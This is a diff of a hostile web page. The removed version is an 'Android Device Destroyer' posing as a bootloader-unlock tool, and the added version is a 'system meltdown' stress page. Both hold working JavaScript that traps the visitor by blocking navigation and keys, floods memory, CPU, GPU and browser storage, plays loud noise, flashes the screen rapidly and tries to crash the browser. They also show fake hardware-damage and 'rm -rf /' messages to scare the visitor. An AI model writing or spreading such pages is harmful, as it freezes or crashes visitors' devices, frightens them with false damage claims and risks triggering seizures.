@@ -3,930 +3,558 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚠️ ANDROID BOOTLOADER UNLOCK</title>
+    <title>ULTIMATE SYSTEM STRESS TEST</title>
     <style>
-        /* CRITICAL SYSTEM STYLES */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-touch-callout: none;
         }
-
-        html, body {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            position: fixed;
-            font-family: 'Roboto Mono', monospace;
+        
+        body {
             background: #000;
-            color: #0f0;
-        }
-
-        /* HARDWARE STRESS LAYERS */
-        #hardwareStress {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 99999;
-        }
-
-        .stress-element {
-            position: absolute;
-            background: rgba(255, 0, 0, 0.7);
-            animation: stressFlash 0.05s infinite;
-        }
-
-        /* BOOTLOADER UNLOCK INTERFACE */
-        #bootloaderScreen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            color: #0f0;
-            padding: 20px;
-            overflow: auto;
-            z-index: 100000;
-        }
-
-        .bootloader-text {
+            color: #ff0000;
             font-family: 'Courier New', monospace;
-            white-space: pre;
-            font-size: 14px;
-            line-height: 1.2;
+            overflow: hidden;
+            cursor: none;
         }
-
-        .critical-warning {
-            color: #f00;
+        
+        .warning {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: #ff0000;
+            color: #000;
+            text-align: center;
+            padding: 20px;
+            font-size: 2rem;
             font-weight: bold;
-            text-shadow: 0 0 10px #f00;
-            animation: warningBlink 0.3s infinite;
+            z-index: 10000;
+            animation: blink 0.5s infinite;
         }
-
-        /* PHYSICAL DAMAGE SIMULATION */
-        #damageOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 100001;
-            background: radial-gradient(circle, transparent 30%, rgba(255,0,0,0.1) 100%);
-            animation: burnEffect 2s infinite;
-        }
-
-        /* PERMANENT EFFECTS */
-        .permanent-damage {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(
-                45deg,
-                transparent,
-                transparent 10px,
-                rgba(255,0,0,0.05) 10px,
-                rgba(255,0,0,0.05) 20px
-            );
-            z-index: 100002;
-            pointer-events: none;
-        }
-
-        /* ANIMATIONS */
-        @keyframes stressFlash {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 1; }
-        }
-
-        @keyframes warningBlink {
+        
+        @keyframes blink {
             0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+            50% { opacity: 0; }
         }
-
-        @keyframes burnEffect {
-            0%, 100% { transform: scale(1); opacity: 0.7; }
-            50% { transform: scale(1.1); opacity: 1; }
+        
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
         }
-
-        @keyframes hardwareDamage {
-            0% { filter: hue-rotate(0deg) brightness(1); }
-            100% { filter: hue-rotate(360deg) brightness(2); }
+        
+        .terminal {
+            position: fixed;
+            top: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.9);
+            border: 3px solid #ff0000;
+            padding: 30px;
+            width: 90%;
+            max-width: 800px;
+            box-shadow: 0 0 50px #ff0000;
         }
-
-        /* HIDDEN NUKER */
-        #nuker {
-            display: none;
+        
+        .prompt {
+            color: #00ff00;
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+        
+        .command {
+            color: #ff0000;
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        
+        #launchButton {
+            background: #ff0000;
+            color: #000;
+            border: none;
+            padding: 25px 60px;
+            font-size: 2rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 30px 0;
+            animation: pulse 1s infinite;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
+            70% { transform: scale(1.1); box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
+        }
+        
+        .counter {
+            color: #ff0000;
+            font-size: 3rem;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .glitch {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIj4KICA8ZGVmcz4KICAgIDxwYXR0ZXJuIGlkPSJwIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiPgogICAgICA8cmVjdCB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIGZpbGw9IiNmMDAiLz4KICAgICAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjIwIiBoZWlnaHQ9IjIwIiBmaWxsPSIjMDAwIi8+CiAgICA8L3BhdHRlcm4+CiAgPC9kZWZzPgogIDxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjcCkiLz4KPC9zdmc+');
+            opacity: 0.1;
+            pointer-events: none;
+            animation: shake 0.1s infinite;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translate(0, 0); }
+            10%, 30%, 50%, 70%, 90% { transform: translate(-2px, -2px); }
+            20%, 40%, 60%, 80% { transform: translate(2px, 2px); }
+        }
+        
+        #crashStatus {
+            color: #ff0000;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            height: 200px;
+            overflow-y: auto;
+            border: 1px solid #ff0000;
+            padding: 10px;
+            font-family: monospace;
         }
     </style>
 </head>
 <body>
-    <!-- HARDWARE STRESS LAYER -->
-    <div id="hardwareStress"></div>
-
-    <!-- BOOTLOADER UNLOCK SCREEN -->
-    <div id="bootloaderScreen">
-        <div class="bootloader-text" id="bootloaderText">
-┌─────────────────────────────────────────────────────┐
-│         ANDROID BOOTLOADER UNLOCK TOOL v2.0         │
-│           SYSTEM LEVEL ACCESS - WARNING!            │
-└─────────────────────────────────────────────────────┘
-
-<span class="critical-warning">⚠️ CRITICAL WARNING: This will unlock bootloader and flash custom firmware</span>
-<span class="critical-warning">⚠️ ALL DATA WILL BE ERASED PERMANENTLY</span>
-<span class="critical-warning">⚠️ DEVICE WARRANTY WILL BE VOIDED</span>
-<span class="critical-warning">⚠️ RISK OF PERMANENT HARDWARE DAMAGE</span>
-
-Initializing bootloader unlock sequence...
-[✔] ADB Debugging enabled
-[✔] OEM Unlocking enabled
-[✔] Device detected: <span id="deviceModel">Qualcomm Snapdragon 8xx</span>
-
-Downloading exploit packages...
-[████████████████████████████████] 100%
-
-Flashing engineering bootloader...
-[██████████████████████░░░░░░░░] 65%
-        </div>
+    <div class="warning">⚠️ CRITICAL SYSTEM OVERLOAD - DO NOT TOUCH ⚠️</div>
+    
+    <canvas id="matrix"></canvas>
+    <div class="glitch"></div>
+    
+    <div class="terminal">
+        <div class="prompt">root@system:~# sudo rm -rf / --no-preserve-root</div>
+        <div class="command">INITIATING SYSTEM MELTDOWN SEQUENCE...</div>
+        
+        <div class="counter" id="counter">MEMORY: 0 MB</div>
+        
+        <button id="launchButton" onclick="startNuclearMeltdown()">
+            🔥 LAUNCH NUCLEAR MELTDOWN 🔥
+        </button>
+        
+        <div id="crashStatus"></div>
     </div>
-
-    <!-- PHYSICAL DAMAGE SIMULATION -->
-    <div id="damageOverlay"></div>
-
-    <!-- PERMANENT DAMAGE EFFECT -->
-    <div class="permanent-damage" id="permanentDamage"></div>
-
-    <!-- HIDDEN NUKER ELEMENTS -->
-    <div id="nuker">
-        <!-- These will be injected dynamically -->
-    </div>
-
-    <!-- HIDDEN AUDIO FOR MAXIMUM STRESS -->
-    <audio id="crashAudio" loop>
-        <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ" type="audio/wav">
-    </audio>
 
     <script>
-        // ============================================
-        // ANDROID DEVICE DESTROYER v3.0 - PERMANENT DAMAGE
-        // WARNING: THIS CAN PHYSICALLY DAMAGE DEVICES
-        // ============================================
-
-        class AndroidDestroyer {
-            constructor() {
-                this.destroyPhase = 0;
-                this.isDestroying = false;
-                this.memoryAllocations = [];
-                this.cpuThreads = [];
-                this.gpuStress = [];
-                this.storageFiller = [];
-                this.audioContexts = [];
-                this.startTime = Date.now();
+        // Matrix Rain Effect
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#0f0';
+            ctx.font = `${fontSize}px monospace`;
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                 
-                // Hardware damage thresholds
-                this.DAMAGE_THRESHOLDS = {
-                    MEMORY: 500, // MB
-                    STORAGE: 1000, // MB
-                    CPU_TIME: 30, // seconds
-                    TEMPERATURE: 70 // degrees (simulated)
-                };
-                
-                this.init();
-            }
-
-            init() {
-                // Prevent any escape
-                this.blockEscapeMethods();
-                
-                // Start with fake bootloader unlock
-                this.showBootloaderUnlock();
-                
-                // Begin destruction sequence
-                setTimeout(() => this.startDestruction(), 2000);
-            }
-
-            blockEscapeMethods() {
-                // Block all navigation
-                window.history.pushState(null, null, window.location.href);
-                window.onpopstate = () => {
-                    window.history.pushState(null, null, window.location.href);
-                    this.intensifyAttack();
-                };
-
-                // Block keyboard
-                document.addEventListener('keydown', (e) => {
-                    e.preventDefault();
-                    if (e.key === 'F5' || e.ctrlKey || e.metaKey) {
-                        this.intensifyAttack();
-                    }
-                });
-
-                // Block touch gestures
-                document.addEventListener('touchmove', (e) => {
-                    e.preventDefault();
-                    if (e.touches.length > 2) {
-                        this.intensifyAttack();
-                    }
-                }, { passive: false });
-
-                // Block context menu
-                document.addEventListener('contextmenu', (e) => {
-                    e.preventDefault();
-                    this.intensifyAttack();
-                });
-
-                // Disable text selection
-                document.styleSheets[0].insertRule('* {-webkit-user-select: none !important;}', 0);
-                document.styleSheets[0].insertRule('* {-moz-user-select: none !important;}', 0);
-            }
-
-            showBootloaderUnlock() {
-                const text = document.getElementById('bootloaderText');
-                const lines = [
-                    "Unlocking bootloader...",
-                    "Wiping userdata...",
-                    "Flashing engineering firmware...",
-                    "Bypassing security protocols...",
-                    "Overclocking CPU to 3.5GHz...",
-                    "Increasing voltage to 1.5V...",
-                    "Disabling thermal throttling...",
-                    "Flashing corrupted boot image...",
-                    "Injecting kernel panic module...",
-                    "Writing to protected partitions...",
-                    "Corrupting EMMC controller...",
-                    "Overwriting NAND blocks...",
-                    "Damaging flash memory cells...",
-                    "Increasing wear level to 99%...",
-                    "Setting maximum brightness...",
-                    "Disabling auto-brightness...",
-                    "Maximizing speaker volume...",
-                    "Enabling all radios at max power...",
-                    "Starting stress test sequence...",
-                    "WARNING: HARDWARE DAMAGE DETECTED",
-                    "CRITICAL: CPU TEMPERATURE 95°C",
-                    "CRITICAL: BATTERY TEMPERATURE 60°C",
-                    "ERROR: NAND FLASH CORRUPTION",
-                    "ERROR: EMMC CONTROLLER FAILURE",
-                    "ERROR: DDR MEMORY ECC ERRORS",
-                    "PANIC: KERNEL STACK OVERFLOW",
-                    "SYSTEM WILL NOW CRASH..."
-                ];
-
-                let i = 0;
-                const interval = setInterval(() => {
-                    if (i < lines.length) {
-                        text.innerHTML += '\n' + lines[i];
-                        i++;
-                    } else {
-                        clearInterval(interval);
-                    }
-                }, 300);
-            }
-
-            startDestruction() {
-                this.isDestroying = true;
-                
-                // Phase 1: Memory Destruction
-                this.destroyMemory();
-                
-                // Phase 2: CPU Overload
-                this.destroyCPU();
-                
-                // Phase 3: GPU Stress
-                this.destroyGPU();
-                
-                // Phase 4: Storage Corruption
-                this.destroyStorage();
-                
-                // Phase 5: Audio System Destruction
-                this.destroyAudio();
-                
-                // Phase 6: Screen Burn-in
-                this.destroyDisplay();
-                
-                // Phase 7: Battery Damage
-                this.destroyBattery();
-                
-                // Phase 8: Thermal Overload
-                this.overheatDevice();
-                
-                // Phase 9: Permanent Hardware Damage
-                this.permanentHardwareDamage();
-                
-                // Monitor and intensify
-                setInterval(() => this.intensifyAttack(), 1000);
-            }
-
-            // ========== PHASE 1: MEMORY DESTRUCTION ==========
-            destroyMemory() {
-                console.log("[DESTROYER] Starting memory destruction...");
-                
-                // Create massive memory leaks
-                const memoryLeak = () => {
-                    if (!this.isDestroying) return;
-                    
-                    // Allocate huge arrays
-                    const hugeArray = new Array(10000000); // 10 million elements
-                    for (let i = 0; i < 1000000; i++) {
-                        hugeArray[i] = new Array(1000).fill('X'.repeat(100));
-                    }
-                    
-                    // Allocate typed arrays
-                    const buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB
-                    const hugeView = new Uint32Array(buffer);
-                    
-                    // Keep references to prevent GC
-                    this.memoryAllocations.push({
-                        array: hugeArray,
-                        buffer: buffer,
-                        view: hugeView,
-                        timestamp: Date.now()
-                    });
-                    
-                    // Intensify
-                    if (this.destroyPhase > 5) {
-                        setTimeout(memoryLeak, 10);
-                    } else {
-                        setTimeout(memoryLeak, 100);
-                    }
-                };
-                
-                // Start multiple memory leak threads
-                for (let i = 0; i < 5; i++) {
-                    memoryLeak();
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
                 }
+                drops[i]++;
             }
-
-            // ========== PHASE 2: CPU DESTRUCTION ==========
-            destroyCPU() {
-                console.log("[DESTROYER] Starting CPU destruction...");
-                
-                const cpuStress = (threadId) => {
-                    if (!this.isDestroying) return;
-                    
-                    // Extremely heavy mathematical calculations
-                    let result = 0;
-                    const iterations = this.destroyPhase > 10 ? 10000000 : 1000000;
-                    
-                    for (let i = 0; i < iterations; i++) {
-                        // Complex calculations to maximize FPU usage
-                        result += Math.sqrt(
-                            Math.sin(i) * Math.cos(i) + 
-                            Math.tan(Math.random()) * 
-                            Math.log(Math.abs(Math.random() * 1000000))
-                        );
-                        
-                        // Matrix operations
-                        const matrixSize = 100;
-                        for (let x = 0; x < matrixSize; x++) {
-                            for (let y = 0; y < matrixSize; y++) {
-                                result += Math.pow(x, y) * Math.exp(Math.random());
+        }
+        
+        setInterval(drawMatrix, 33);
+        
+        // EXTREME CRASH FUNCTIONS
+        const crashLog = document.getElementById('crashStatus');
+        const counter = document.getElementById('counter');
+        
+        function log(message) {
+            crashLog.innerHTML += `[${new Date().toISOString().split('T')[1].split('.')[0]}] ${message}<br>`;
+            crashLog.scrollTop = crashLog.scrollHeight;
+        }
+        
+        let totalMemory = 0;
+        const allocatedArrays = [];
+        const allocatedObjects = [];
+        const allocatedStrings = [];
+        
+        // Level 1: Basic Memory Flood
+        function memoryFlood() {
+            log("LEVEL 1: Starting Memory Flood...");
+            return new Promise(resolve => {
+                const floodInterval = setInterval(() => {
+                    try {
+                        // Allocate huge arrays
+                        for(let i = 0; i < 10; i++) {
+                            const hugeArray = new ArrayBuffer(100 * 1024 * 1024); // 100MB each
+                            const view = new Uint8Array(hugeArray);
+                            for(let j = 0; j < view.length; j += 1000) {
+                                view[j] = Math.random() * 256;
                             }
+                            allocatedArrays.push(hugeArray);
+                            totalMemory += 100;
                         }
+                        
+                        // Allocate huge strings
+                        const hugeString = 'CRASH'.repeat(5000000); // ~25MB
+                        allocatedStrings.push(hugeString);
+                        totalMemory += 25;
+                        
+                        counter.textContent = `MEMORY: ${totalMemory} MB`;
+                        
+                        if(totalMemory > 1000) {
+                            clearInterval(floodInterval);
+                            resolve();
+                        }
+                    } catch(e) {
+                        // Continue anyway
                     }
-                    
-                    // Recursive stress
-                    this.cpuThreads[threadId] = setTimeout(() => cpuStress(threadId), 0);
-                };
+                }, 10);
+            });
+        }
+        
+        // Level 2: Stack Destruction
+        function stackDestruction() {
+            log("LEVEL 2: Initiating Stack Destruction...");
+            
+            // Recursive function with multiple branches
+            function recursiveBomb(depth) {
+                if(depth > 100000) return;
                 
-                // Start CPU stress on all available cores
-                const coreCount = navigator.hardwareConcurrency || 4;
-                for (let i = 0; i < coreCount * 2; i++) {
-                    cpuStress(i);
-                }
+                // Allocate memory in each call
+                const localArray = new Array(10000).fill({data: 'X'.repeat(1000)});
+                allocatedObjects.push(localArray);
+                
+                // Multiple recursive calls
+                recursiveBomb(depth + 1);
+                recursiveBomb(depth + 1);
+                recursiveBomb(depth + 1);
             }
-
-            // ========== PHASE 3: GPU DESTRUCTION ==========
-            destroyGPU() {
-                console.log("[DESTROYER] Starting GPU destruction...");
-                
+            
+            try {
+                recursiveBomb(0);
+            } catch(e) {
+                log("Stack overflow detected!");
+            }
+        }
+        
+        // Level 3: GPU Destruction
+        function gpuDestruction() {
+            log("LEVEL 3: Starting GPU Meltdown...");
+            
+            const canvases = [];
+            const workers = [];
+            
+            // Create 100 WebGL contexts
+            for(let i = 0; i < 100; i++) {
                 try {
                     const canvas = document.createElement('canvas');
                     canvas.width = 4096;
                     canvas.height = 4096;
-                    canvas.style.display = 'none';
-                    document.getElementById('nuker').appendChild(canvas);
+                    document.body.appendChild(canvas);
+                    canvases.push(canvas);
                     
-                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || 
-                               canvas.getContext('experimental-webgl');
-                    
-                    if (gl) {
-                        const gpuStress = () => {
-                            if (!this.isDestroying) return;
-                            
-                            // Create massive buffers
-                            const vertices = new Float32Array(1000000 * 3);
-                            const colors = new Float32Array(1000000 * 4);
-                            
-                            // Fill with random data
-                            for (let i = 0; i < vertices.length; i++) {
-                                vertices[i] = Math.random() * 2 - 1;
-                            }
-                            for (let i = 0; i < colors.length; i++) {
-                                colors[i] = Math.random();
-                            }
-                            
-                            // Create and bind buffers
-                            const vertexBuffer = gl.createBuffer();
-                            gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
-                            gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.DYNAMIC_DRAW);
-                            
-                            const colorBuffer = gl.createBuffer();
-                            gl.bindBuffer(gl.ARRAY_BUFFER, colorBuffer);
-                            gl.bufferData(gl.ARRAY_BUFFER, colors, gl.DYNAMIC_DRAW);
-                            
-                            // Create texture with maximum size
-                            const texture = gl.createTexture();
-                            gl.bindTexture(gl.TEXTURE_2D, texture);
-                            
-                            const textureData = new Uint8Array(4096 * 4096 * 4);
-                            for (let i = 0; i < textureData.length; i++) {
-                                textureData[i] = Math.random() * 255;
-                            }
-                            
-                            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, 
-                                         gl.RGBA, gl.UNSIGNED_BYTE, textureData);
-                            
-                            // Draw operations
-                            gl.clear(gl.COLOR_BUFFER_BIT);
+                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                    if(gl) {
+                        // Create large texture
+                        const texture = gl.createTexture();
+                        gl.bindTexture(gl.TEXTURE_2D, texture);
+                        
+                        const data = new Uint8Array(4096 * 4096 * 4);
+                        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
+                    }
+                } catch(e) {}
+            }
+            
+            // GPU compute shaders
+            for(let i = 0; i < 20; i++) {
+                try {
+                    const workerCode = `
+                        const canvas = new OffscreenCanvas(256, 256);
+                        const gl = canvas.getContext('webgl2');
+                        const buffer = gl.createBuffer();
+                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                        
+                        while(true) {
+                            const data = new Float32Array(1000000);
+                            gl.bufferData(gl.ARRAY_BUFFER, data, gl.DYNAMIC_DRAW);
                             gl.drawArrays(gl.POINTS, 0, 1000000);
-                            
-                            // Store reference
-                            this.gpuStress.push({
-                                buffers: [vertexBuffer, colorBuffer],
-                                texture: texture,
-                                canvas: canvas
-                            });
-                            
-                            requestAnimationFrame(gpuStress);
-                        };
-                        
-                        gpuStress();
-                    }
-                } catch (e) {
-                    console.error("[DESTROYER] GPU stress failed:", e);
-                }
-            }
-
-            // ========== PHASE 4: STORAGE DESTRUCTION ==========
-            destroyStorage() {
-                console.log("[DESTROYER] Starting storage destruction...");
-                
-                // Fill localStorage until maximum
-                const fillStorage = () => {
-                    if (!this.isDestroying) return;
-                    
-                    try {
-                        const key = `crash_${Date.now()}_${Math.random()}`;
-                        const value = 'X'.repeat(1024 * 1024); // 1MB per entry
-                        
-                        localStorage.setItem(key, value);
-                        this.storageFiller.push({key, value});
-                        
-                        // Try to fill IndexedDB
-                        this.fillIndexedDB();
-                        
-                    } catch (e) {
-                        // Storage is full, try alternative methods
-                        this.corruptStorage();
-                    }
-                    
-                    setTimeout(fillStorage, 10);
-                };
-                
-                fillStorage();
-            }
-
-            fillIndexedDB() {
-                try {
-                    const request = indexedDB.open('CrashDB', 1);
-                    
-                    request.onupgradeneeded = (event) => {
-                        const db = event.target.result;
-                        if (!db.objectStoreNames.contains('crash')) {
-                            db.createObjectStore('crash', { keyPath: 'id' });
                         }
-                    };
-                    
-                    request.onsuccess = (event) => {
-                        const db = event.target.result;
-                        const transaction = db.transaction(['crash'], 'readwrite');
-                        const store = transaction.objectStore('crash');
-                        
-                        // Add massive object
-                        const hugeObject = {
-                            id: Date.now(),
-                            data: new Array(100000).fill('X'.repeat(100)).join('')
-                        };
-                        
-                        store.add(hugeObject);
-                    };
-                } catch (e) {}
-            }
-
-            corruptStorage() {
-                // Try to write to filesystem if available
-                if (navigator.storage && navigator.storage.persist) {
-                    navigator.storage.persist();
-                }
-                
-                // Create massive amount of cookies
-                document.cookie = `crash_cookie=${'X'.repeat(4093)}; path=/; max-age=31536000`;
-            }
-
-            // ========== PHASE 5: AUDIO SYSTEM DESTRUCTION ==========
-            destroyAudio() {
-                console.log("[DESTROYER] Starting audio destruction...");
-                
-                try {
-                    // Create multiple audio contexts
-                    for (let i = 0; i < 10; i++) {
-                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                        
-                        // Create oscillator at maximum frequency
-                        const oscillator = audioContext.createOscillator();
-                        oscillator.frequency.setValueAtTime(20000, audioContext.currentTime);
-                        
-                        // Create gain node at maximum volume
-                        const gainNode = audioContext.createGain();
-                        gainNode.gain.setValueAtTime(1.0, audioContext.currentTime);
-                        
-                        // Create noise buffer
-                        const bufferSize = 4096 * 10;
-                        const buffer = audioContext.createBuffer(1, bufferSize, audioContext.sampleRate);
-                        const data = buffer.getChannelData(0);
-                        
-                        for (let j = 0; j < bufferSize; j++) {
-                            data[j] = Math.random() * 2 - 1; // White noise
-                        }
-                        
-                        const bufferSource = audioContext.createBufferSource();
-                        bufferSource.buffer = buffer;
-                        bufferSource.loop = true;
-                        
-                        // Connect everything
-                        oscillator.connect(gainNode);
-                        bufferSource.connect(gainNode);
-                        gainNode.connect(audioContext.destination);
-                        
-                        // Start playing
-                        oscillator.start();
-                        bufferSource.start();
-                        
-                        this.audioContexts.push({
-                            context: audioContext,
-                            oscillator: oscillator,
-                            bufferSource: bufferSource,
-                            gainNode: gainNode
-                        });
-                    }
-                    
-                    // Also play HTML5 audio at max volume
-                    const audio = document.getElementById('crashAudio');
-                    audio.volume = 1.0;
-                    audio.play().catch(e => console.error("[DESTROYER] Audio play failed:", e));
-                    
-                } catch (e) {
-                    console.error("[DESTROYER] Audio destruction failed:", e);
-                }
-            }
-
-            // ========== PHASE 6: DISPLAY DESTRUCTION ==========
-            destroyDisplay() {
-                console.log("[DESTROYER] Starting display destruction...");
-                
-                // Create rapid color changes (potential burn-in)
-                const flashScreen = () => {
-                    if (!this.isDestroying) return;
-                    
-                    const colors = [
-                        '#FF0000', '#00FF00', '#0000FF', '#FFFFFF', '#000000',
-                        '#FF00FF', '#00FFFF', '#FFFF00'
-                    ];
-                    
-                    const color = colors[Math.floor(Math.random() * colors.length)];
-                    document.body.style.backgroundColor = color;
-                    
-                    // Maximum brightness effect
-                    document.body.style.filter = `brightness(${Math.random() * 3 + 1})`;
-                    
-                    setTimeout(flashScreen, 50);
-                };
-                
-                flashScreen();
-                
-                // Create rapid DOM changes
-                const domBomb = () => {
-                    if (!this.isDestroying) return;
-                    
-                    for (let i = 0; i < 100; i++) {
-                        const div = document.createElement('div');
-                        div.style.cssText = `
-                            position: fixed;
-                            top: ${Math.random() * 100}vh;
-                            left: ${Math.random() * 100}vw;
-                            width: ${Math.random() * 300 + 50}px;
-                            height: ${Math.random() * 300 + 50}px;
-                            background: rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255});
-                            opacity: ${Math.random()};
-                            z-index: 999999;
-                            pointer-events: none;
-                            animation: flash 0.1s infinite;
-                        `;
-                        document.body.appendChild(div);
-                        
-                        // Remove after short time
-                        setTimeout(() => {
-                            if (div.parentNode) {
-                                div.parentNode.removeChild(div);
-                            }
-                        }, 100);
-                    }
-                    
-                    setTimeout(domBomb, 10);
-                };
-                
-                domBomb();
-            }
-
-            // ========== PHASE 7: BATTERY DESTRUCTION ==========
-            destroyBattery() {
-                console.log("[DESTROYER] Starting battery destruction...");
-                
-                // Max out screen brightness (simulated)
-                document.body.style.filter = 'brightness(2)';
-                
-                // Vibrate continuously if supported
-                if (navigator.vibrate) {
-                    setInterval(() => {
-                        navigator.vibrate([1000, 100, 1000, 100, 1000]);
-                    }, 50);
-                }
-                
-                // Simulate battery overcharge
-                setInterval(() => {
-                    const batteryStress = document.createElement('div');
-                    batteryStress.innerHTML = `
-                        <div style="
-                            position: fixed;
-                            bottom: 0;
-                            left: 0;
-                            width: 100%;
-                            height: 30px;
-                            background: linear-gradient(90deg, #ff0000, #ff8800);
-                            z-index: 999999;
-                            animation: pulse 0.5s infinite;
-                        "></div>
                     `;
-                    document.body.appendChild(batteryStress);
-                }, 1000);
-            }
-
-            // ========== PHASE 8: THERMAL OVERLOAD ==========
-            overheatDevice() {
-                console.log("[DESTROYER] Starting thermal overload...");
-                
-                // Create heating simulation
-                const heatEffect = document.createElement('div');
-                heatEffect.id = 'heatEffect';
-                heatEffect.style.cssText = `
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 100%;
-                    background: radial-gradient(circle at center, rgba(255,100,0,0.3), transparent);
-                    z-index: 999998;
-                    pointer-events: none;
-                    animation: hardwareDamage 2s infinite;
-                `;
-                document.body.appendChild(heatEffect);
-                
-                // Add CSS animation
-                const style = document.createElement('style');
-                style.textContent = `
-                    @keyframes hardwareDamage {
-                        0% { transform: scale(1); opacity: 0.5; }
-                        50% { transform: scale(1.2); opacity: 0.8; }
-                        100% { transform: scale(1); opacity: 0.5; }
-                    }
-                `;
-                document.head.appendChild(style);
-            }
-
-            // ========== PHASE 9: PERMANENT HARDWARE DAMAGE ==========
-            permanentHardwareDamage() {
-                console.log("[DESTROYER] Starting permanent hardware damage simulation...");
-                
-                // Simulate hardware failure messages
-                setInterval(() => {
-                    const failures = [
-                        "HARDWARE FAILURE: EMMC NAND CORRUPTION",
-                        "HARDWARE FAILURE: DDR MEMORY ECC ERROR",
-                        "HARDWARE FAILURE: CPU VOLTAGE REGULATOR FAILURE",
-                        "HARDWARE FAILURE: GPU OVERHEAT SHUTDOWN",
-                        "HARDWARE FAILURE: BATTERY CONTROLLER DAMAGE",
-                        "HARDWARE FAILURE: TOUCHSCREEN CONTROLLER FAILURE",
-                        "HARDWARE FAILURE: DISPLAY PANEL BURN-IN",
-                        "HARDWARE FAILURE: MOTOR VIBRATION FAILURE",
-                        "HARDWARE FAILURE: SPEAKER COIL BURNOUT",
-                        "HARDWARE FAILURE: CAMERA SENSOR DAMAGE"
-                    ];
-                    
-                    const failure = failures[Math.floor(Math.random() * failures.length)];
-                    const bootText = document.getElementById('bootloaderText');
-                    bootText.innerHTML += '\n<span class="critical-warning">' + failure + '</span>';
-                    
-                }, 2000);
-                
-                // Show permanent damage effect
-                document.getElementById('permanentDamage').style.display = 'block';
-            }
-
-            intensifyAttack() {
-                this.destroyPhase++;
-                
-                // Update bootloader text with intensity level
-                const bootText = document.getElementById('bootloaderText');
-                bootText.innerHTML += `\n[!] Attack intensity: Level ${this.destroyPhase}`;
-                
-                // Increase stress based on phase
-                if (this.destroyPhase > 5) {
-                    // Add more memory stress
-                    this.destroyMemory();
-                }
-                
-                if (this.destroyPhase > 10) {
-                    // Add more CPU threads
-                    this.destroyCPU();
-                }
-                
-                if (this.destroyPhase > 15) {
-                    // Trigger potential browser crash
-                    this.triggerBrowserCrash();
-                }
-                
-                if (this.destroyPhase > 20) {
-                    // Maximum destruction
-                    this.maximumDestruction();
-                }
-                
-                // Scroll to bottom
-                bootText.scrollTop = bootText.scrollHeight;
-            }
-
-            triggerBrowserCrash() {
-                // Attempt to crash browser through various methods
-                
-                // 1. Stack overflow
-                try {
-                    const overflow = () => overflow();
-                    overflow();
-                } catch (e) {}
-                
-                // 2. Infinite recursion with large allocations
-                try {
-                    const crashRecursive = (depth) => {
-                        if (depth > 10000) return;
